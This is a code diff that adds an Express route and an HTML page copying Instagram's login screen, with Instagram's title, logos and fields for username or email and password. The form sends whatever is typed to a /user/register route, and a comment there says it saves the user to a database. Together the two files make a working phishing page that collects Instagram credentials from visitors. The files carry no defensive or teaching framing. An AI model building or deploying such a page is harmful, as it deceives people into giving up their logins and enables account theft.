@@ -1,0 +1,65 @@
+const express = require("express");
+const router = express.Router();
+const { createUser } = require("../controller/userController");
+
+// POST route - save user to database
+router.post("/register", createUser);
+
+module.exports = router;
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="/css/style.css" />
+  </head>
+  <body>
+    <div class="page-wrapper">
+      <!-- Language selector at top -->
+      <div class="language-selector">English (US)</div>
+
+      <!-- Instagram logo -->
+      <div class="logo-section">
+        <img src="/css/insta.svg" alt="Instagram" class="instagram-logo" />
+      </div>
+
+      <!-- Login form -->
+      <div class="form-section">
+        <form action="/user/register" method="POST">
+          <div class="form-group">
+            <input
+              type="text"
+              id="username"
+              name="username"
+              placeholder="Username, email or mobile number"
+              required
+            />
+          </div>
+          <div class="form-group">
+            <input
+              type="password"
+              id="password"
+              name="password"
+              placeholder="Password"
+              required
+            />
+          </div>
+          <button type="submit" class="login-btn">Log in</button>
+        </form>
+
+        <div class="forgot-password">
+          <a href="#">Forgot password?</a>
+        </div>
+      </div>
+
+      <!-- Bottom section -->
+      <div class="bottom-section">
+        <button class="create-account-btn">Create new account</button>
+        <div class="meta-logo">
+          <img src="/eJmGMdNKxpD.png" alt="Meta" class="meta-img" />
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
